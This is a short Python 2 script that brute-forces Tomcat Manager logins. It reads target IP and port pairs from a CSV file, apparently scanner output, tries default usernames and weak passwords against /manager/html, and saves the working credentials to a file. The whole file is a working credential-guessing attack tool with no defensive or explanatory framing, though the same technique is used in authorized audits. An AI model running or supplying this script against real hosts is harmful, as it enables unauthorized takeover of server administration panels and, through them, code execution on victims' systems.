#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = 'JeeWin'

import requests as req
import sys
from multiprocessing import Pool
import re

def brute_force(ip_port):
    unames = ['tomcat', 'admin']
    pwds = ['tomcat', 'tomcat123', '123456', '12345']
    url = 'http://' + ip_port[0] + ':' + ip_port[1] + '/manager/html'
    #print url,
    for uname in unames:
        for pwd in pwds:
            try:

                response = req.get(url, auth=(uname, pwd), timeout=5)
                print url, uname, pwd, response.status_code
            except Exception as e:
                print url, e
                return

            if response.status_code == 200:
                s = re.findall(r".*Tomcat.*", response.content)
                if s:
                    f = open('tomcat_vul.txt','a')
                    f.write(url + ':' + uname + ':' + pwd + '\n')
                    f.close()
                    print url, 'have vul', uname, pwd


if __name__ == '__main__':

    urls = []
    # urls.append(['10.223.2.60','9090'])

    for line in open(sys.argv[1]):
        line = line.strip('\n')
        if not line.split(',')[0] == "saddr":
            ip = line.split(',')[0]
            urls.append([ip, line.split(',')[1]])

    #print urls
    pool = Pool(1)
    pool.map(brute_force, urls)
    pool.close()
    pool.join()
